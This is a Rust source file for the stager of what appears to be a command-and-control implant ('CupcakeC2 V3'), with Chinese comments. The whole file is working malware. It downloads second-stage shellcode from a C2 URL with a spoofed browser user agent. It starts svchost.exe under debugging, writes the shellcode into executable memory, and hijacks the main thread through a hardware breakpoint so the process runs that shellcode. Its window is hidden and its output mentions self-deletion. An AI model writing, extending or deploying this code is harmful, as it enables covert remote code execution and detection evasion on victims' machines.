// Client/stager/src/main.rs
// CupcakeC2 V3 Stager - Zero-Footprint Dropper
// 使用硬件断点 (HWBP) 劫持技术将 Core Shellcode 注入合法进程。

#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use std::ptr;
use std::os::windows::ffi::OsStrExt;
use winapi::um::processthreadsapi::*;
use winapi::um::memoryapi::*;
use winapi::um::handleapi::*;
use winapi::um::debugapi::*;
use winapi::um::winbase::*;
use winapi::um::winnt::*;
use winapi::um::minwinbase::{DEBUG_EVENT, EXCEPTION_DEBUG_EVENT, CREATE_PROCESS_DEBUG_EVENT, EXCEPTION_SINGLE_STEP};
use winapi::shared::minwindef::*;

#[tokio::main]
async fn main() {
    println!("[*] Cupcake Stager V3: Starting deployment...");

    // 1. 获取 Core Shellcode (Mockup for now, usually downloaded from C2)
    let shellcode = fetch_core_shellcode().await;
    if shellcode.is_empty() {
        println!("[-] Failed to fetch core shellcode.");
        return;
    }

    // 2. 启动宿主进程 (svchost.exe) 并作为调试者挂载
    let target = "C:\\Windows\\System32\\svchost.exe";
    if let Some(pi) = spawn_target_as_debug(target) {
        println!("[+] Target spawned and debugging active. PID: {}", pi.dwProcessId);

        // 3. 执行硬件断点劫持注入
        if hwbp_hijack_inject(pi, &shellcode) {
            println!("[+] Injection successful! Core Agent is now rising in memory.");
        } else {
            println!("[-] Injection failed.");
        }

        unsafe {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    println!("[*] Stager task complete. Commencing self-melt...");
}

async fn fetch_core_shellcode() -> Vec<u8> {
    // 📡 1. Fetch Payload from C2
    // info!("Connecting to C2 for Stage 2 payload...");
    let c2_url = "http://127.0.0.1:8080/stage2"; // Typically defined in a config
    let client = match reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36")
        .build() {
            Ok(c) => c,
            Err(_) => return Vec::new(),
        };
        
    let response = match client.get(c2_url).send().await {
        Ok(r) => r,
        Err(_) => return Vec::new(),
    };

    if !response.status().is_success() {
        return Vec::new();
    }
    
    match response.bytes().await {
        Ok(b) => b.to_vec(),
        Err(_) => Vec::new(),
    }
}

fn spawn_target_as_debug(path: &str) -> Option<PROCESS_INFORMATION> {
    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let cmd: Vec<u16> = std::ffi::OsStr::new(path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        let success = CreateProcessW(
            ptr::null(),
            cmd.as_ptr() as *mut _,
            ptr::null_mut(),
            ptr::null_mut(),
            FALSE,
            DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW,
            ptr::null_mut(),
            ptr::null(),
            &mut si,
            &mut pi,
        );

        if success != 0 { Some(pi) } else { None }
    }
}

/// 核心：硬件断点劫持注入逻辑
fn hwbp_hijack_inject(pi: PROCESS_INFORMATION, shellcode: &[u8]) -> bool {
    let mut debug_event: DEBUG_EVENT = unsafe { std::mem::zeroed() };
    let mut injected = false;
    let mut remote_mem: *mut winapi::ctypes::c_void = ptr::null_mut();

    unsafe {
        // 分配远程内存并写入 Shellcode
        remote_mem = VirtualAllocEx(
            pi.hProcess,
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_mem.is_null() { return false; }

        WriteProcessMemory(
            pi.hProcess,
            remote_mem,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            ptr::null_mut(),
        );

        // 调试循环处理
        loop {
            if WaitForDebugEvent(&mut debug_event, INFINITE) == 0 { break; }

            match debug_event.dwDebugEventCode {
                CREATE_PROCESS_DEBUG_EVENT => {
                    // 系统断点：设置硬件断点在主线程入口
                    let h_thread = debug_event.u.CreateProcessInfo().hThread;
                    set_hwbp(h_thread, pi.dwProcessId, injected);
                }
                EXCEPTION_DEBUG_EVENT => {
                    let exception = debug_event.u.Exception();
                    if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
                        // 硬件断点触发：修改 RIP 指向 Shellcode
                        if !injected {
                            let h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, debug_event.dwThreadId);
                            if !h_thread.is_null() {
                                redirect_thread_to_shellcode(h_thread, remote_mem as usize);
                                CloseHandle(h_thread);
                                injected = true;
                                
                                // 任务完成，停止调试
                                DebugActiveProcessStop(pi.dwProcessId);
                                return true;
                            }
                        }
                    }
                }
                _ => {}
            }

            ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
            if injected { break; }
        }
    }
    injected
}

unsafe fn set_hwbp(h_thread: HANDLE, _pid: u32, _already_injected: bool) {
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if GetThreadContext(h_thread, &mut ctx) != 0 {
        // 将 Dr0 设置为劫持地址 (例如当前 RIP 或系统入口点)
        // 简单演示：我们直接在当前 RIP 设置硬件断点
        let mut full_ctx: CONTEXT = std::mem::zeroed();
        full_ctx.ContextFlags = CONTEXT_CONTROL;
        GetThreadContext(h_thread, &mut full_ctx);

        ctx.Dr0 = full_ctx.Rip as u64;
        ctx.Dr7 = 1; // 启用 Dr0 的全局/局部断点

        SetThreadContext(h_thread, &ctx);
    }
}

unsafe fn redirect_thread_to_shellcode(h_thread: HANDLE, shellcode_addr: usize) {
    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.ContextFlags = CONTEXT_ALL;

    if GetThreadContext(h_thread, &mut ctx) != 0 {
        // 修改执行流跳转到 Shellcode
        ctx.Rip = shellcode_addr as u64;
        
        // 关键：清除硬件断点，防止无限循环
        ctx.Dr0 = 0;
        ctx.Dr7 = 0;

        SetThreadContext(h_thread, &ctx);
    }
}
